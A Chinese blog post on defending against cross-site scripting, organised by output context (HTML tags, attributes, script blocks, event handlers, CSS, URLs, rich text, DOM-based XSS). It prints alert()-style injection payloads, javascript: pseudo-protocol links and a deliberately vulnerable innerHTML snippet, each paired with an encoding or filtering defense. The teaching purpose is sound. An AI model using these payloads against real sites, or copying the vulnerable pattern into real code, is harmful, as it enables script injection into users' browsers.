<p><pre class="lang:xhtml decode:true">&lt;a href=”#” onclick=”alert(‘’);alert(‘2’);”&gt;test&lt;/a&gt;</pre><br>这样就成功的在<code>onclick</code>事件中注入了代码。导致XSS攻击发生的原因就是没有分清楚输出变量的语境，因此并非在模板引擎之中使用了auto-escape就万事大吉了，XSS的防御需要区别情况对待。</p>
<h1 id="正确防御XSS"><a href="#正确防御XSS" class="headerlink" title="正确防御XSS"></a>正确防御XSS</h1><p>XSS本质还是一种HTML注入，用户的数据被当成了HTML代码的一部分来执行，从而混淆了原本的语义，产生了新的语义。</p>
<p>如果网站使用了MVC架构，那么XSS就发生在View层，在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是真正发生攻击的地方做防御。</p>
<p>下面用<code>$var</code>表示用户数据，他将被填充入HTML代码中。可能存在以下场景：</p>
<p><pre class="lang:xhtml decode:true">&lt;div&gt;$var&lt;/div&gt;<br>&lt;a href=# &gt;$var&lt;/a&gt;</pre><br>所有在标签中输出的变量，如果没有做任何处理，都能导致直接产生XSS。</p>
<p>在这种场景下，XSS的利用方式一般是构造一个<code>&amp;lt;script&amp;gt;</code>标签，或者是任何能产生脚本的方式：</p>
<p><pre class="lang:xhtml decode:true">&lt;div&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/div&gt;</pre></p>
<p>&lt;a href=#&gt;&lt;img src=# onerror=alert(1) /&gt;&lt;/a&gt;<br>防御的方法就是对变量使用<code>HtmlEncode</code>。</p>
<h2 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h2><p><pre class="lang:xhtml decode:true">&lt;div id=”abc” name=”$var”&gt;&lt;/div&gt;</pre><br>和HTML标签中输出类似，可能的攻击方法就是构造”来闭合属性，从而攻击：</p>
<p><pre class="lang:xhtml decode:true">&lt;div id=”abc” name=””&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;”” &gt;&lt;/div&gt;</pre><br>防御的方法仍然是<code>HtmlEncode</code>。</p>
<p>在OWASP ESAPI中推荐了一种更为严格的<code>HtmlEncode</code> —— 除了字母、数字外，其他所有的特殊字符都被编码成了<code>HTMLEntities</code>。</p>
<h2 id="在-lt-script-gt-标签输出"><a href="#在-lt-script-gt-标签输出" class="headerlink" title="在&lt;script&gt;标签输出"></a>在&lt;script&gt;标签输出</h2><p>在script标签输出的时候，首先应该确保的是变量在引号之中。</p>
<p><pre class="lang:js decode:true">&lt;script&gt;<br>var x=”$var”<br>&lt;/script&gt;</pre><br>攻击者需要先闭合引号才能实施攻击：</p>
<p><pre class="lang:default decode:true">&lt;script&gt;<br>var x=””;alert(/xss/);//“;<br>&lt;/script&gt;</pre><br>防御的时候使用<code>JavascriptEncode</code>。</p>
<h2 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h2><p>和<code>&amp;lt;script&amp;gt;</code>标签中输出类似</p>
<p><pre class="lang:xhtml decode:true">&lt;a href=# onclick=”funcA(‘$var’)”&gt;test&lt;/a&gt;</pre><br>可能的攻击方法有：</p>
<p><pre class="lang:xhtml decode:true">&lt;a href=# onclick=”funcA(‘’);alert(/xss/);//‘)”&gt;test&lt;/a&gt;</pre><br>防御的时候使用<code>JavascriptEncode</code>。</p>
<h2 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h2><p>一般来说应该尽可能的禁止用户在<code>&amp;lt;style&amp;gt;</code>、HTML标签的<code>style</code>属性以及CSS文件中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的<code>encodeForCSS()</code>函数。除了字母数字外所有字符都被编码成十六进制”<code>\uHH</code>“。</p>
<h2 id="在地址中输出"><a href="#在地址中输出" class="headerlink" title="在地址中输出"></a>在地址中输出</h2><p><pre class="lang:xhtml decode:true ">&lt;a href=”<a href="http://www.evil.com/?test=$var&quot;&gt;test&lt;/a&amp;gt" target="_blank" rel="external">http://www.evil.com/?test=$var&quot;&gt;test&lt;/a&amp;gt</a>;</pre><br>在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，使用<code>URLEncode</code>即可。<code>URLEncode</code>会把字符转换为<code>%HH</code>的形式，比如空格就是<code>%20</code>，<code>&amp;lt;</code>就是<code>%3c</code>。</p>
<p>可能的攻击方法：</p>
<p><pre class="lang:xhtml decode:true ">&lt;a href=”<a href="http://www.evil.com/?test=" target="_blank" rel="external">http://www.evil.com/?test=</a>“ onclick=alert(1)””&gt;test&lt;/a&gt;</pre><br>但是还有一种情况，就是整个URL能够被用户完全控制。这个时候URL的Protocal和Host部分是不可以使用<code>URLEncode</code>的，否则就会改变URL的语义。</p>
<p>一个URL的组成如下：</p>
<p><pre class="lang:default decode:true ">[Protocal][Host][Path][Search][Hash]</pre><br>例如：</p>
<p><pre class="lang:default decode:true "><a href="https://www.evil.com/a/b/c/test?abc=123#sssss" target="_blank" rel="external">https://www.evil.com/a/b/c/test?abc=123#sssss</a><br>[Protocal] = https://<br>[Host] = www.evil.com<br>[Path] = /a/b/c/test<br>[Search] = ?abc=123<br>[Hash] = #sssss</pre><br>在Protocal与Host中，如果使用<code>URLEncode</code>函数，则需要把<code>://</code>、<code>.</code>都编码掉。</p>
<p>对于下面的输出方式：</p>
<p><pre class="lang:xhtml decode:true ">&lt;a href=”$var”&gt;test&lt;/a&gt;</pre><br>攻击者可能会构造伪协议进行攻击：</p>
<p><pre class="lang:xhtml decode:true ">&lt;a href=”javascript:alert(1);”&gt;test&lt;/a&gt;</pre><br>除了<code>javascript</code>作为伪协议执行代码以外，还有<code>vbscript</code>、<code>dataURI</code>等伪协议可以执行脚本。</p>
<p>一般来说，如果变量是整个URL，则应该先检查变量是否以<code>http</code>开头，则保证不会出现出现伪协议类的XSS攻击。在此之后，再对<code>URLEncode</code>，则可以保证不会有此类的XSS发生了。</p>
<h2 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h2><p>有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为富文本。比如一个用户在论坛在论坛中发帖，帖子中的内容要有图片、视频、表格等，这些富文本的效果都需要HTML代码来实现。</p>
<p>所以这个核心还是输入检查，输入检查的主要问题是：检查时还不知道变量的输出语境。但用户提交的富文本数据，其语义是完整的HTML代码，在输出的时候也不会拼接到某个标签的属性中，所以可以特殊情况特殊处理。</p>
<p>在过滤富文本的时候，事件应该是被严格禁止，因为富文本的展示需求不应该包含事件这种动态效果。而一些危险的标签，比如<code>&amp;lt;iframe&amp;gt;</code>、<code>&amp;lt;script&amp;gt;</code>、<code>&amp;lt;base&amp;gt;</code>、<code>&amp;lt;form&amp;gt;</code>都是应该严格禁止的。</p>
<p>在标签的选择上，应该选择白名单，避免使用黑名单。比如，只允许<code>&amp;lt;a&amp;gt;</code>、<code>&amp;lt;img&amp;gt;</code>、<code>&amp;lt;div&amp;gt;</code>等比较安全的标签存在。</p>
<p>白名单原则不仅仅用于标签的选择，同样应该用于属性与事件的选择。同时在富文本过滤中，处理CSS也是一件很麻烦的事情，如果允许用户自定义CSS、style，则也可能导致XSS攻击。因此应该尽可能禁止用户自定义CSS与style。如果一定要允许用户自定义样式的话，那么只能像过滤富文本那样过滤CSS，者需要一个CSS Parser对样式进行智能分析，检查其中是否包含了危险代码。</p>
<p>Anti-Samy是OWASP上一个开元项目，也是目前比较好的XSS Filter。最早他是基于Java的，现在已经扩展到.NET语言。PHP之中，还有另一个项目：<code>HTMLPurify</code>。</p>
<h2 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h2><p>DOM Based XSS是一个非常特别的XSS漏洞，需要特别对待：</p>
<p><pre class="lang:xhtml decode:true ">&lt;script&gt;<br>    function test(){<br>        var str = document.getElementById(‘text’).value;<br>        document.getElementById(‘t’).innerHTML = “&lt;a href=’”+str+”‘&gt;testLink&lt;/a&gt;”;<br>    }<br>&lt;/script&gt;<br>&lt;div id=”t”&gt;&lt;/div&gt;<br>&lt;input type=”text” id=”text” value=”” /&gt;<br>&lt;input type=”button” id=”s” value=”write” onclick=”test();” /&gt;</pre><br>在<code>button</code>的<code>onclick</code>事件，执行了<code>test()</code>函数，则非常关键的一句是：</p>
<p><pre class="lang:js decode:true ">document.getElementById(‘t’).innerHTML = “&lt;a href=’”+str+”‘&gt;testLink&lt;/a&gt;”;</pre><br>将HTML代码写入了DOM节点，最终导致了XSS的发生。</p>
<p>事实上，DOM Based XSS是从Javascript中输出数据到HTML页面，而前文中提到的方法都是针对从服务器应用直接输出到HTML页面的XSS漏洞，因此并不适用于DOM Based XSS。</p>
<p>那么我们还是说一下下面的情况：</p>
<p>&nbsp;</p>
<p>假设这里为了保护变量，服务器端直接进行<code>JavascriptEscape</code>，但是在<code>document.write</code>的时候，仍然能够产生XSS。</p>
<p>原因在于，第一次执行javascriptEscape后，只保护了：</p>
<p><pre class="lang:default decode:true ">var x = “$var”;</pre><br>但是当document.write输出到HTML页面的时候，浏览器重新渲染了页面，在&lt;script&gt;标签执行时，已经对变量x进行了解码，然后在运行的时候就会被XSS。</p>
<p>&nbsp;</p>
</div></article></div></main><footer><div class="paginator"><a href="/2016/05/30/e8-a5-bf-e5-8c-97-e5-b7-a5-e4-b8-9a-e5-a4-a7-e5-ad-a6acm2014-e7-ba-a7-e8-8e-b7-e5-a5-96-e6-83-85-e5-86-b5-e7-bb-9f-e8-ae-a1/" class="prev">上一篇</a><a href="/2016/05/14/logistic-e5-9b-9e-e5-bd-92/" class="next">下一篇</a></div><div class="copyright"><p>© 2013 - 2017 <a href="http://kidozh.com">kido zhang</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>